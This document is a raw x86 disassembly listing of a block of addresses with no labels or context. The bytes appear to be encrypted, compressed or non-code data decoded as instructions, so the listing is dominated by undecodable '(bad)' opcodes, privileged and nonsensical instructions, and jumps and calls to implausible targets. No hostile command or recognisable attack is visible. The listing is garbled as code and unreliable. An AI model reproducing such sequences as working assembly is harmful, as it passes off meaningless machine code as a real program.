  41d764:	dec    edx
  41d765:	rcr    DWORD PTR [edx+0x12],1
  41d768:	(bad)  
  41d769:	sbb    cl,BYTE PTR [eax+0x3e34828a]
  41d76f:	into   
  41d770:	add    BYTE PTR [ebx],dl
  41d772:	dec    edi
  41d773:	dec    ebp
  41d774:	not    BYTE PTR [edx+0x0]
  41d777:	or     al,0xb1
  41d779:	mov    ds:0xf4dec91d,eax
  41d77e:	adc    bl,dh
  41d780:	add    al,0x38
  41d782:	cs stc 
  41d784:	xor    bl,BYTE PTR [edi-0x12ca0e66]
  41d78a:	jecxz  0x41d787
  41d78c:	mov    ds:0xb5ed1a95,eax
  41d791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d792:	ffree  st(2)
  41d794:	call   0xb74c6470
  41d799:	outs   dx,DWORD PTR ds:[esi]
  41d79a:	sub    eax,0xcdcfeee3
  41d79f:	out    0x47,eax
  41d7a1:	pop    ss
  41d7a2:	or     al,0x10
  41d7a4:	enter  0x18af,0xcb
  41d7a8:	or     al,BYTE PTR [ebx-0x20b36bd1]
  41d7ae:	fs je  0x41d804
  41d7b1:	popf   
  41d7b2:	loope  0x41d7cd
  41d7b4:	mov    ds:0xf9ef380b,al
  41d7b9:	icebp  
  41d7ba:	imul   eax,DWORD PTR [esi],0xffffff81
  41d7bd:	xchg   esi,eax
  41d7be:	xchg   esp,eax
  41d7bf:	dec    esi
  41d7c0:	sub    eax,0x0
	...
  41d831:	add    BYTE PTR [eax],al
  41d833:	add    BYTE PTR [ebx+0x34],ah
  41d836:	lods   eax,DWORD PTR ds:[esi]
  41d837:	xor    al,0xff
  41d839:	mov    ebp,0xf28777fb
  41d83e:	pop    es
  41d83f:	add    eax,esi
  41d841:	shl    BYTE PTR [ecx+ecx*8+0x13d98],1
  41d848:	cmc    
  41d849:	add    BYTE PTR [eax],al
  41d84b:	add    ch,ch
  41d84d:	sub    dh,BYTE PTR [eax+0x4862db46]
  41d853:	xor    DWORD PTR [ebx+ecx*1],ebp
  41d856:	in     eax,dx
  41d857:	scas   eax,DWORD PTR es:[edi]
  41d858:	or     cl,BYTE PTR [eax]
  41d85a:	dec    esp
  41d85b:	cld    
  41d85c:	aaa    
  41d85d:	pop    ss
  41d85e:	inc    ebp
  41d85f:	scas   eax,DWORD PTR es:[edi]
  41d860:	scas   eax,DWORD PTR es:[edi]
  41d861:	dec    esp
  41d862:	ins    BYTE PTR es:[edi],dx
  41d863:	arpl   WORD PTR [esi-0xe087acb],bx
  41d869:	ins    DWORD PTR es:[edi],dx
  41d86a:	nop
  41d86b:	mov    ebp,0xdcf784a4
  41d870:	inc    esi
  41d871:	xchg   BYTE PTR [edi-0x64],dl
  41d874:	mov    ecx,DWORD PTR [ebp+0x2d]
  41d877:	leave  
  41d878:	in     al,dx
  41d879:	sbb    ch,bl
  41d87b:	rcr    DWORD PTR [edx],0xa0
  41d87e:	sbb    DWORD PTR ds:0xbad71094,0x3799b21
  41d888:	xchg   edx,eax
  41d889:	ja     0x41d8b1
  41d88b:	stos   BYTE PTR es:[edi],al
  41d88c:	aad    0xed
  41d88e:	push   esp
  41d88f:	dec    ecx
  41d890:	fimul  DWORD PTR [ebp+0x39]
  41d893:	mov    al,ds:0x8c115a69
  41d898:	imul   esi,DWORD PTR [ebx+0x7f23c9c3],0x7b
  41d89f:	pushf  
  41d8a0:	jp     0x41d82c
  41d8a2:	mov    ecx,0xd1757c62
  41d8a7:	jp     0x41d847
  41d8a9:	fwait
  41d8aa:	or     DWORD PTR [esp+ebp*1-0x22],esi
  41d8ae:	lahf   
  41d8af:	inc    edi
  41d8b0:	inc    esp
  41d8b1:	adc    DWORD PTR [ebx-0xc],esi
  41d8b4:	sbb    al,0x1e
  41d8b6:	pop    esp
  41d8b7:	pushw  ds
  41d8b9:	sub    ecx,eax
  41d8bb:	call   DWORD PTR [esi+ebx*8]
  41d8be:	outs   dx,BYTE PTR ds:[esi]
  41d8bf:	inc    esp
  41d8c0:	dec    BYTE PTR [edi+0x51]
  41d8c3:	pop    esi
  41d8c4:	mov    ds:0x74f44c69,al
  41d8c9:	imul   esi,DWORD PTR [edi-0xa],0x667fc94d
  41d8d0:	fist   DWORD PTR ds:0x2f81fab4
  41d8d6:	ret    0x95e
  41d8d9:	test   eax,0x36f43224
  41d8de:	pop    ecx
  41d8df:	or     ebx,DWORD PTR [eax-0x76]
  41d8e2:	jecxz  0x41d8a3
  41d8e4:	push   ecx
  41d8e5:	in     eax,0x42
  41d8e7:	(bad)  
  41d8e8:	(bad)  
  41d8e9:	rol    ch,1
  41d8eb:	shr    DWORD PTR [ebx],cl
  41d8ed:	ret    0xd11c
  41d8f0:	add    al,0xf5
  41d8f2:	popa   
  41d8f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8f4:	sahf   
  41d8f5:	int    0xa4
  41d8f7:	sub    BYTE PTR [edx],bl
  41d8f9:	stos   DWORD PTR es:[edi],eax
  41d8fa:	and    DWORD PTR [ecx],ebx
  41d8fc:	dec    esp
  41d8fd:	and    cl,BYTE PTR [esi-0x3b7c05fa]
  41d903:	mov    eax,0x3a390a86
  41d908:	jp     0x41d924
  41d90a:	scas   eax,DWORD PTR es:[edi]
  41d90b:	ins    BYTE PTR es:[edi],dx
  41d90c:	lahf   
  41d90d:	jne    0x41d973
  41d90f:	mov    dh,bl
  41d911:	xchg   esp,eax
  41d912:	lods   al,BYTE PTR ds:[esi]
  41d913:	fst    DWORD PTR [ebx+0x77]
  41d916:	mov    cl,0x3d
  41d918:	icebp  
  41d919:	ror    DWORD PTR [eax],cl
  41d91b:	das    
  41d91c:	daa    
  41d91d:	arpl   ax,sp
  41d91f:	nop
  41d920:	mov    eax,ds:0x9223fc04
  41d925:	adc    DWORD PTR [edi+0x74],eax
  41d928:	cdq    
  41d929:	mov    bl,0x4b
  41d92b:	sub    DWORD PTR [esi+0x59114610],eax
  41d931:	fwait
  41d932:	lahf   
  41d933:	(bad)  
  41d935:	add    al,0x22
  41d937:	loop   0x41d8ea
  41d939:	xchg   esp,eax
  41d93a:	mov    edi,ebp
  41d93c:	pop    ecx
  41d93d:	test   ebp,esp
  41d93f:	(bad)  
  41d940:	popa   
	...
  41d9b1:	add    BYTE PTR [eax],al
  41d9b3:	add    al,dh
  41d9b5:	retf   0xfc94
  41d9b8:	mov    esi,0xfdcef8fe
  41d9bd:	cwde   
  41d9be:	sbb    eax,0x9ce1a61c
  41d9c3:	add    DWORD PTR [ebp-0xafffec2],ecx
  41d9c9:	add    BYTE PTR [eax],al
  41d9cb:	add    BYTE PTR [eax],bh
  41d9cd:	ss xor eax,0x6113b9ca
  41d9d3:	(bad)  
  41d9d4:	xor    DWORD PTR [edi-0x40],ebx
  41d9d7:	sub    BYTE PTR [ecx-0x77cb62ba],ch
  41d9dd:	cmc    
  41d9de:	nop
  41d9df:	push   ecx
  41d9e0:	xor    al,0xf
  41d9e2:	lods   al,BYTE PTR ds:[esi]
  41d9e3:	cmp    DWORD PTR [ebx],ebp
  41d9e5:	repnz cmp dl,BYTE PTR [ecx]
  41d9e8:	data16 stc 
  41d9ea:	and    al,0x4c
  41d9ec:	sbb    BYTE PTR [ebx-0x76],ch
  41d9ef:	test   DWORD PTR [ecx-0x26a3ddb7],edi
  41d9f5:	leave  
  41d9f6:	aas    
  41d9f7:	inc    ecx
  41d9f8:	and    dh,cl
  41d9fa:	pop    ebx
  41d9fb:	mov    al,0x82
  41d9fd:	int    0xd4
  41d9ff:	lahf   
  41da00:	and    al,0x79
  41da02:	mov    cl,0x65
  41da04:	sbb    edx,ebp
  41da06:	jecxz  0x41d9c8
  41da08:	mov    bl,0x56
  41da0a:	ror    ch,0xc5
  41da0d:	fnsave [edi-0x22]
  41da10:	fisttp WORD PTR [esi+0x24c8cb9c]
  41da16:	pop    ebx
  41da17:	imul   ebp,DWORD PTR [eax],0xce5d7fad
  41da1d:	sti    
  41da1e:	test   DWORD PTR [esi-0x49816092],esp
  41da24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da25:	sahf   
  41da26:	and    BYTE PTR [eax-0x24],ch
  41da29:	(bad)  
  41da2a:	jle    0x41d9c4
  41da2c:	jmp    0x41da39
  41da2e:	push   ebx
  41da2f:	push   edi
  41da30:	xor    dl,BYTE PTR [ecx+0x3a]
  41da33:	ret    0x5134
  41da36:	mov    esi,0xe5f7f6eb
  41da3b:	loopne 0x41d9c7
  41da3d:	push   cs
  41da3e:	imul   ebx,edi,0x4e43b0f6
  41da44:	push   ecx
  41da45:	in     al,0xf1
  41da47:	pop    esi
  41da48:	add    DWORD PTR [edx],esp
  41da4a:	fcom   DWORD PTR [ecx]
  41da4c:	das    
  41da4d:	jbe    0x41da7f
  41da4f:	test   al,0xad
  41da51:	add    BYTE PTR [ebp-0x1e076587],ch
  41da57:	ret    0xbf4a
  41da5a:	shr    BYTE PTR [eax+0x2f430f64],cl
  41da60:	fwait
  41da61:	shl    BYTE PTR [ecx+0x6f26c7c9],1
  41da67:	clc    
  41da68:	clc    
  41da69:	mov    bh,0xed
  41da6b:	dec    edx
  41da6c:	or     eax,0xa0c25bc6
  41da71:	rol    esp,1
  41da73:	add    ch,cl
  41da75:	xor    DWORD PTR [ebx+0x33],ebp
  41da78:	or     ecx,ecx
  41da7a:	dec    esi
  41da7b:	sub    eax,0xae974a6f
  41da80:	dec    edi
  41da81:	adc    al,0x2c
  41da83:	push   edx
  41da84:	mov    WORD PTR [esi],?
  41da86:	sti    
  41da87:	into   
  41da88:	and    DWORD PTR [ebp-0x2f],esi
  41da8b:	mov    edi,0x183a829c
  41da90:	inc    eax
  41da91:	cld    
  41da92:	int3   
  41da93:	pop    edx
  41da94:	dec    esp
  41da95:	pop    ds
  41da96:	fist   WORD PTR [ebp+eiz*8+0x315c3b11]
  41da9d:	or     al,0x9d
  41da9f:	scas   eax,DWORD PTR es:[edi]
  41daa0:	(bad)  
  41daa1:	xor    ecx,ebx
  41daa3:	pusha  
  41daa4:	dec    ebp
  41daa5:	aaa    
  41daa6:	inc    esi
  41daa7:	loop   0x41dac0
  41daa9:	sub    DWORD PTR [ebx+esi*2-0x21],0x11313a
  41dab1:	jae    0x41dad2
  41dab3:	dec    edx
  41dab4:	jne    0x41dab9
  41dab6:	jo     0x41da64
  41dab8:	xchg   esi,eax
  41dab9:	nop
  41daba:	cmp    DWORD PTR cs:[esi-0x69f921e1],esi
	...
  41db31:	add    BYTE PTR [eax],al
  41db33:	add    BYTE PTR [ecx],ch
  41db35:	(bad)  
  41db36:	sti    
  41db37:	pop    ebp
  41db38:	(bad)  
  41db39:	jge    0x41daea
  41db3b:	div    dl
  41db3d:	cmp    ebp,0xb
  41db40:	mov    DWORD PTR [ebx],ebx
  41db42:	jbe    0x41db42
  41db44:	cmp    BYTE PTR [edi],0x1
  41db47:	add    ch,dh
  41db49:	add    BYTE PTR [eax],al
  41db4b:	add    bh,cl
  41db4d:	cmc    
  41db4e:	clc    
  41db4f:	ins    DWORD PTR es:[edi],dx
  41db50:	ret    0x2d24
  41db53:	out    dx,eax
  41db54:	mov    eax,0xcf5fc2c5
  41db59:	add    DWORD PTR [ebp+eiz*8+0x1e0fbbd3],0xeec4b26
  41db64:	je     0x41db97
  41db66:	(bad)  
  41db67:	bound  eax,QWORD PTR [ebp+0x73ea75a4]
  41db6d:	(bad)  
  41db6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db6f:	aam    0xf
  41db71:	aas    
  41db72:	call   0x31b6bf0f
  41db77:	mov    al,ds:0x93eb37f3
  41db7c:	add    eax,0x7cf9b228
  41db81:	sub    eax,0xc4f18c63
  41db86:	sub    DWORD PTR [edi+0x442e9a51],0x387dbf91
  41db90:	aaa    
  41db91:	push   cs
  41db92:	sbb    DWORD PTR [eax],esp
  41db94:	rcl    BYTE PTR [ebp+0x46],0x4
  41db98:	sahf   
  41db99:	cmp    DWORD PTR [ecx],esp
  41db9b:	pushf  
  41db9c:	xchg   bh,bl
  41db9e:	mov    esp,0xb6aaff70
  41dba3:	pop    ebx
  41dba4:	fcmovbe st,st(5)
  41dba6:	ss jns 0x41dbdd
  41dba9:	aam    0xe2
  41dbab:	or     eax,DWORD PTR [ebp-0x57]
  41dbae:	repnz popf 
  41dbb0:	out    0x37,al
  41dbb2:	push   esi
  41dbb3:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41dbb5:	or     BYTE PTR [ebp+0x57],dh
  41dbb8:	shl    ecx,cl
  41dbba:	rcr    cl,0xb2
  41dbbd:	jmp    0xeffa6a2c
  41dbc2:	jp     0x41db8d
  41dbc4:	and    al,BYTE PTR [esp+ecx*2]
  41dbc7:	ficom  WORD PTR [eax+eax*1]
  41dbca:	push   ebp
  41dbcb:	xor    dh,BYTE PTR [esi+0x3d]
  41dbce:	push   edi
  41dbcf:	inc    esi
  41dbd0:	cmp    dh,BYTE PTR [esi+0x3a]
  41dbd3:	test   al,0x74
  41dbd5:	daa    
  41dbd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbd7:	push   0x5d
  41dbd9:	call   0xe9dda6be
  41dbde:	out    dx,eax
  41dbdf:	cmc    
  41dbe0:	mov    edx,0xdffdce84
  41dbe5:	imul   ecx,DWORD PTR [ebx],0xffffff89
  41dbe8:	fimul  DWORD PTR [esi*4+0x607c79ba]
  41dbef:	mul    dh
  41dbf1:	hlt    
  41dbf2:	push   0x97b7b614
  41dbf7:	dec    ecx
  41dbf8:	xor    al,0x28
  41dbfa:	cmp    eax,0x6786fb11
  41dbff:	jno    0x41dbc7
  41dc01:	mov    ch,0xca
  41dc03:	repz (bad) 
  41dc05:	mov    ch,0x69
  41dc07:	hlt    
  41dc08:	out    0xfb,al
  41dc0a:	xor    DWORD PTR [ebp-0x23],esp
  41dc0d:	inc    eax
  41dc0e:	out    dx,eax
  41dc0f:	xlat   BYTE PTR ds:[ebx]
  41dc10:	jle    0x41dbc6
  41dc12:	inc    edi
  41dc13:	cli    
  41dc14:	dec    ebp
  41dc15:	cmp    al,0x67
  41dc17:	push   esi
  41dc18:	jg     0x41dbe9
  41dc1a:	adc    BYTE PTR [ebx+0x42],al
  41dc1d:	add    bl,BYTE PTR ds:0xd821b6f0
  41dc23:	fmul   DWORD PTR [ebx]
  41dc25:	jae    0x41dbf6
  41dc27:	jp     0x41dbd4
  41dc29:	ss es push ecx
  41dc2c:	xlat   BYTE PTR ds:[ebx]
  41dc2d:	inc    esi
  41dc2e:	in     al,0x7
  41dc30:	inc    ebp
  41dc31:	(bad)  
  41dc32:	cld    
  41dc33:	inc    esp
  41dc34:	dec    eax
  41dc35:	cli    
  41dc36:	jmp    0x41dcb5
  41dc38:	pop    eax
  41dc39:	fist   WORD PTR [ebx-0x5582b4d8]
  41dc3f:	mov    eax,0xa8
	...
  41dcb4:	pusha  
  41dcb5:	cdq    
  41dcb6:	fsubr  st(5),st
  41dcb8:	std    
  41dcb9:	in     eax,0x79
  41dcbb:	popf   
  41dcbc:	jle    0x41dc59
  41dcbe:	es and al,0x52
  41dcc1:	sbb    al,0x39
  41dcc3:	imul   esi,DWORD PTR [edi+0x40],0xf50001
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	aad    0x8d
  41dcce:	cmp    al,BYTE PTR [eax+0x4a]
  41dcd1:	pop    ebx
  41dcd2:	(bad)  
  41dcd3:	push   edi
  41dcd4:	and    ebp,ebx
  41dcd6:	lock or ah,BYTE PTR [edx+ebp*2-0x66]
  41dcdb:	mov    esi,0xf602ce7
  41dce0:	(bad)  
  41dce1:	mov    esp,0x2a1722e3
  41dce6:	ins    DWORD PTR es:[edi],dx
  41dce7:	ja     0x41dd28
  41dce9:	fstp   QWORD PTR [ebp+0x3b]
  41dcec:	jnp    0x41dd30
  41dcee:	push   0x794d1c13
  41dcf3:	fcom   DWORD PTR [esi]
  41dcf5:	push   es
  41dcf6:	dec    esp
  41dcf7:	push   es
  41dcf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcf9:	fwait
  41dcfa:	or     BYTE PTR [ebp+0x15a52621],bh
  41dd00:	arpl   di,si
  41dd02:	icebp  
  41dd03:	cmp    DWORD PTR [bx+si-0x3533],eax
  41dd08:	mov    dl,BYTE PTR [ecx+0x3ef9173c]
  41dd0e:	and    dl,dh
  41dd10:	out    dx,al
  41dd11:	fnstsw WORD PTR [esi-0x30]
  41dd14:	cmc    
  41dd15:	xchg   esi,eax
  41dd16:	inc    esi
  41dd17:	jbe    0x41dd8f
  41dd19:	ins    BYTE PTR es:[edi],dx
  41dd1a:	xor    al,0x9d
  41dd1c:	arpl   WORD PTR [edx],si
  41dd1e:	or     bl,BYTE PTR [edx-0x37edabbd]
  41dd24:	mov    al,ds:0x2838a9ab
  41dd29:	das    
  41dd2a:	aaa    
  41dd2b:	mov    ecx,0x8ad4ecf7
  41dd30:	repz (bad) 
  41dd33:	jbe    0x41dd5a
  41dd35:	adc    eax,0x72d6e4c2
  41dd3a:	scas   al,BYTE PTR es:[edi]
  41dd3b:	push   ebp
  41dd3c:	(bad)  
  41dd3d:	js     0x41dcd2
  41dd3f:	cmp    DWORD PTR [edi],esp
  41dd41:	and    ebx,DWORD PTR [esi]
  41dd43:	call   0x43b36350
  41dd48:	aaa    
  41dd49:	ficom  WORD PTR [edi]
  41dd4b:	pop    edi
  41dd4c:	add    al,BYTE PTR [eax-0x69]
  41dd4f:	push   edx
  41dd50:	shl    DWORD PTR [esi],1
  41dd52:	xchg   ebp,eax
  41dd53:	or     BYTE PTR [ecx-0x3],ch
  41dd56:	add    eax,0xf7163409
  41dd5b:	out    0xd1,eax
  41dd5d:	inc    esi
  41dd5e:	scas   eax,DWORD PTR es:[edi]
  41dd5f:	and    ah,al
  41dd61:	pop    edx
  41dd62:	inc    edi
  41dd63:	mov    bh,BYTE PTR [ebx]
  41dd65:	mov    esp,0x615af2fb
  41dd6a:	adc    esp,DWORD PTR [esi+ebp*8]
  41dd6d:	xchg   ebp,eax
  41dd6e:	xlat   BYTE PTR ds:[ebx]
  41dd6f:	adc    al,0x5b
  41dd71:	dec    esi
  41dd72:	jmp    0x41dd1e
  41dd74:	shl    BYTE PTR [eax+0x2b],cl
  41dd77:	shl    BYTE PTR [edi+0x1ca9f193],0xe7
  41dd7e:	mov    ebp,edx
  41dd80:	call   0xf566:0x95eccbf7
  41dd87:	pop    ecx
  41dd88:	test   dl,0xfd
  41dd8b:	loop   0x41dd74
  41dd8d:	stc    
  41dd8e:	xor    bl,BYTE PTR [esp+ebp*1+0x6cda4549]
  41dd95:	or     eax,0x1b956a96
  41dd9a:	sub    al,0x10
  41dd9c:	mov    ds:0x5c52954b,al
  41dda1:	dec    ebp
  41dda2:	inc    edi
  41dda3:	cld    
  41dda4:	pop    edx
  41dda5:	jcxz   0x41de26
  41dda8:	or     dl,bh
  41ddaa:	int    0x15
  41ddac:	xchg   DWORD PTR [eax-0x70],edx
  41ddaf:	or     edx,DWORD PTR [edx+0x1379286e]
  41ddb5:	mov    dl,0xf7
  41ddb7:	dec    eax
  41ddb8:	xchg   ecx,eax
  41ddb9:	jae    0x41dddd
  41ddbb:	imul   edx,DWORD PTR [edi-0x8],0x12
  41ddbf:	push   edx
  41ddc0:	add    BYTE PTR ss:[eax],al
	...
  41de33:	add    BYTE PTR [edi],al
  41de35:	jp     0x41de1f
  41de37:	jnp    0x41de36
  41de39:	sti    
  41de3a:	xchg   edi,eax
  41de3b:	jle    0x41ddf3
  41de3d:	popf   
  41de3e:	loopne 0x41ddc2
  41de40:	cmp    BYTE PTR [ebp+0x416cdcb3],bl
  41de46:	add    DWORD PTR [eax],eax
  41de48:	cmc    
  41de49:	add    BYTE PTR [eax],al
  41de4b:	add    bl,bh
  41de4d:	ret    
  41de4e:	or     ebx,DWORD PTR [eax]
  41de50:	test   DWORD PTR [ebp+esi*8-0x2ed17977],ebx
  41de57:	xchg   ebx,eax
  41de58:	icebp  
  41de59:	(bad)  
  41de5a:	std    
  41de5b:	pop    ebp
  41de5c:	cmp    DWORD PTR [eax+0x1fd8b7da],edi
  41de62:	in     al,dx
  41de63:	out    0x84,eax
  41de65:	pop    esi
  41de66:	cmp    BYTE PTR [edi],dh
  41de68:	jge    0x41de46
  41de6a:	lahf   
  41de6b:	or     eax,0x4e1c6eee
  41de70:	mov    esi,0xc23e4e64
  41de75:	push   0xcb1b03be
  41de7a:	pop    edi
  41de7b:	imul   eax,ebp,0x85eae59e
  41de81:	adc    eax,0xe63a98c6
  41de86:	pop    ecx
  41de87:	ins    DWORD PTR es:[edi],dx
  41de88:	cmp    al,0x11
  41de8a:	popa   
  41de8b:	mov    ah,0xed
  41de8d:	enter  0x2175,0xa9
  41de91:	mov    ds:0x44055ccc,al
  41de96:	shl    BYTE PTR [ecx],0x81
  41de99:	pop    es
  41de9a:	mov    esp,0xa5352f98
  41de9f:	scas   al,BYTE PTR es:[edi]
  41dea0:	out    0xb6,al
  41dea2:	add    ah,BYTE PTR [edi+0x7031805a]
  41dea8:	and    dh,BYTE PTR fs:[edx]
  41deab:	call   FWORD PTR [eax+0x2]
  41deae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41deaf:	mov    bl,0x54
  41deb1:	add    ebp,DWORD PTR [ecx-0xd]
  41deb4:	dec    ebx
  41deb5:	push   edx
  41deb6:	mov    eax,ds:0xdcd895f2
  41debb:	cwde   
  41debc:	jns    0x41df1b
  41debe:	xchg   edi,eax
  41debf:	fsub   st(6),st
  41dec1:	push   eax
  41dec2:	push   edi
  41dec3:	repnz (bad) 
  41dec5:	lock (bad) 
  41dec7:	retf   
  41dec8:	adc    dh,BYTE PTR [ebp+0x23]
  41decb:	push   ecx
  41decc:	out    dx,al
  41decd:	sub    DWORD PTR [edx],eax
  41decf:	sbb    DWORD PTR [edi],ecx
  41ded1:	test   dh,ch
  41ded3:	test   DWORD PTR ds:0x505e1293,0xb7eaa7b8
  41dedd:	stos   DWORD PTR es:[edi],eax
  41dede:	call   0xf5c3:0x833ea7d5
  41dee5:	jnp    0x41df28
  41dee7:	pop    ebp
  41dee8:	ror    DWORD PTR [esi+ebx*2-0x51dac803],cl
  41deef:	xchg   edi,eax
  41def0:	xchg   ecx,eax
  41def1:	and    dl,BYTE PTR [esi+ebx*2-0x6e097d5]
  41def8:	push   es
  41def9:	mov    al,0xe9
  41defb:	repnz and BYTE PTR ds:0x3a834efc,bh
  41df02:	push   esi
  41df03:	jb     0x41dec0
  41df05:	pop    eax
  41df06:	retf   
  41df07:	sbb    eax,0x4a618b62
  41df0c:	xor    DWORD PTR [edx-0x2431cf9a],ebp
  41df12:	cmp    DWORD PTR [ebp-0x172a719a],esi
  41df18:	xchg   edi,eax
  41df19:	push   ds
  41df1a:	leave  
  41df1b:	hlt    
  41df1c:	stos   BYTE PTR es:[edi],al
  41df1d:	jne    0x41df97
  41df1f:	sbb    al,0xeb
  41df21:	adc    BYTE PTR [eax+0x74736be8],bh
  41df27:	dec    BYTE PTR [edx]
  41df29:	push   esi
  41df2a:	add    ebp,edi
  41df2c:	adc    al,0x26
  41df2e:	adc    cl,BYTE PTR [ecx+0x4]
  41df31:	les    esp,FWORD PTR [edx+0x8]
  41df34:	sbb    bl,bh
  41df36:	xor    eax,0x6fd196aa
  41df3b:	push   ss
  41df3c:	inc    BYTE PTR [eax+0x26]
  41df3f:	retf   0xb4
	...
  41dfb2:	add    BYTE PTR [eax],al
  41dfb4:	mov    ecx,0xad432034
  41dfb9:	push   edi
  41dfba:	sti    
  41dfbb:	(bad)  
  41dfbc:	loopne 0x41df65
  41dfbe:	cmp    ebx,DWORD PTR [esi]
  41dfc0:	test   DWORD PTR [eax+0x4261e5ae],esp
  41dfc6:	add    DWORD PTR [eax],eax
  41dfc8:	cmc    
  41dfc9:	add    BYTE PTR [eax],al
  41dfcb:	add    BYTE PTR [eax],bl
  41dfcd:	add    ebx,esp
  41dfcf:	clc    
  41dfd0:	cmp    BYTE PTR [ebp-0x50],cl
  41dfd3:	add    eax,0x977d2b67
  41dfd8:	mov    eax,0xca566427
  41dfdd:	ins    DWORD PTR es:[edi],dx
  41dfde:	and    ebx,ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	jp     0x41e014
  41dfe3:	sahf   
  41dfe4:	dec    edi
  41dfe5:	outs   dx,DWORD PTR ds:[esi]
  41dfe6:	cs inc ebp
  41dfe8:	out    0xe7,eax
  41dfea:	adc    eax,0x2402a19b
  41dfef:	push   0xffffffd6
  41dff1:	add    ecx,0x69
  41dff4:	js     0x41e062
  41dff6:	mov    ds:0x63d7e5a8,al
  41dffb:	in     eax,dx
  41dffc:	cmp    dh,BYTE PTR [edi]
  41dffe:	mov    BYTE PTR ds:0x67257c29,bl
  41e004:	enter  0xe552,0xaf
  41e008:	movhlps xmm1,xmm1
  41e00b:	xchg   esi,eax
  41e00c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e00d:	adc    eax,0x7341567b
  41e012:	xchg   edi,eax
  41e013:	adc    eax,0xdcbc8e70
  41e018:	xchg   edi,eax
  41e019:	div    esi
  41e01b:	hlt    
  41e01c:	xchg   ebp,eax
  41e01d:	pop    ebp
  41e01e:	push   edx
  41e01f:	gs ins BYTE PTR es:[edi],dx
  41e021:	sbb    al,0x58
  41e023:	and    edi,DWORD PTR [ebx+ebp*1-0xf]
  41e027:	call   0xcd1d:0x688c963f
  41e02e:	popf   
  41e02f:	cmp    eax,DWORD PTR [edx]
  41e031:	inc    ebx
  41e032:	std    
  41e033:	push   esp
  41e034:	(bad)  
  41e035:	scas   al,BYTE PTR es:[edi]
  41e036:	ins    DWORD PTR es:[edi],dx
  41e037:	mov    edx,0xfd44661c
  41e03c:	bound  ebx,QWORD PTR [ecx]
  41e03e:	sbb    BYTE PTR [edx+0x10a480e0],bh
  41e044:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e046:	fld    TBYTE PTR [esi+0x3633eecf]
  41e04c:	dec    esi
  41e04d:	xchg   edx,eax
  41e04e:	mov    ah,0xa1
  41e050:	inc    ebx
  41e051:	or     al,0xf8
  41e053:	push   ecx
  41e054:	pop    ecx
  41e055:	inc    esi
  41e056:	daa    
  41e057:	int    0x97
  41e059:	push   edi
  41e05a:	sub    al,0x60
  41e05c:	and    ebx,edi
  41e05e:	out    dx,eax
  41e05f:	std    
  41e060:	xor    BYTE PTR [ebx],al
  41e062:	stc    
  41e063:	add    BYTE PTR [eax+eiz*8],0xd9
  41e067:	pop    edx
  41e068:	add    bl,cl
  41e06a:	int    0x1
  41e06c:	imul   edi,DWORD PTR [edi+ecx*8+0x44150dcf],0x501c3484
  41e077:	nop
  41e078:	or     BYTE PTR [eax],0x28
  41e07b:	popf   
  41e07c:	in     al,dx
  41e07d:	push   esi
  41e07e:	xchg   ecx,eax
  41e07f:	sbb    edi,DWORD PTR [esi]
  41e081:	mul    DWORD PTR [eax]
  41e083:	icebp  
  41e084:	or     eax,0x4c0d410f
  41e089:	dec    ebp
  41e08a:	repz or al,0x69
  41e08d:	dec    esp
  41e08e:	xchg   bh,dl
  41e090:	test   BYTE PTR [ecx-0x34],bh
  41e093:	dec    edx
  41e094:	add    al,dh
  41e096:	add    al,0xcb
  41e098:	sahf   
  41e099:	jl     0x41e06c
  41e09b:	mov    dh,0x6a
  41e09d:	or     ebp,ebp
  41e09f:	xchg   esp,eax
  41e0a0:	adc    DWORD PTR [ecx+0x32458ea0],0xffffffc2
  41e0a7:	or     eax,0x1c3a855a
  41e0ac:	sub    esp,DWORD PTR [edi+0x2d]
  41e0af:	add    ah,dh
  41e0b1:	sbb    edx,DWORD PTR [ecx]
  41e0b3:	test   al,0x80
  41e0b5:	hlt    
  41e0b6:	fwait
  41e0b7:	int    0xff
  41e0b9:	rcl    DWORD PTR [edx+0x7b],0xeb
  41e0bd:	push   0xd4188e
	...
  41e132:	add    BYTE PTR [eax],al
  41e134:	push   eax
  41e135:	ret    
  41e136:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41e13c:	and    al,0x13
  41e13e:	push   ss
  41e13f:	dec    edi
  41e140:	fnsave [ecx+0x23]
  41e143:	jg     0x41e19b
  41e145:	inc    ebx
  41e146:	add    DWORD PTR [eax],eax
  41e148:	cmc    
  41e149:	add    BYTE PTR [eax],al
  41e14b:	add    BYTE PTR [eax],cl
  41e14d:	add    ah,dh
  41e14f:	aad    0x78
  41e151:	cdq    
  41e152:	xor    BYTE PTR [ebx+0x33549e9d],dl
  41e158:	sahf   
  41e159:	mov    ebx,esp
  41e15b:	pop    eax
  41e15c:	imul   edx,DWORD PTR [bp+0x78d0],0x4e
  41e162:	mov    al,0xdd
  41e164:	or     DWORD PTR [ecx-0x4e],edi
  41e167:	push   ebp
  41e168:	cmp    eax,0x95bce163
  41e16d:	sbb    ch,dl
  41e16f:	fidiv  WORD PTR [edx-0x5471c9de]
  41e175:	in     al,0x4b
  41e177:	mov    al,BYTE PTR [esi]
  41e179:	mov    eax,ds:0x804f303c
  41e17e:	icebp  
  41e17f:	jge    0x41e1df
  41e181:	das    
  41e182:	mov    ds,esi
  41e184:	shr    DWORD PTR [ecx],1
  41e186:	pop    ds
  41e187:	mov    cl,0xef
  41e189:	aaa    
  41e18a:	jno    0x41e1bd
  41e18c:	pop    ecx
  41e18d:	dec    ebp
  41e18e:	mov    ch,0x85
  41e190:	mov    bh,0x18
  41e192:	out    dx,al
  41e193:	sub    ch,BYTE PTR [eax-0xf]
  41e196:	jne    0x41e1c3
  41e198:	aas    
  41e199:	cmp    bh,dh
  41e19b:	or     DWORD PTR [edi-0x2e5d2dd3],ebx
  41e1a1:	cmp    dl,BYTE PTR [esi]
